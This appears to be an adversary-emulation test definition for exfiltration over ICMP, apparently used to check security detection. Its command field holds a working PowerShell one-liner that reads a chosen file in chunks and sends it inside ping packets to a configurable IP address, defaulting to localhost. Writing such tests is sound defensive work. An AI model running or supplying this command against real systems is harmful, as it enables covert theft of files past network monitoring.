name: Exfiltration Over Alternative Protocol - ICMP
description:
Exfiltration of specified file over ICMP protocol.

Upon successful execution, powershell will utilize ping (icmp) to exfiltrate notepad.exe to a remote address (default 127.0.0.1). Results will be via stdout.

data.command: $ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }

input_arguments.name: input_file
input_arguments.description: Path to file to be exfiltrated.

input_arguments.name: ip_address
input_arguments.description: Destination IP address where the data should be sent.
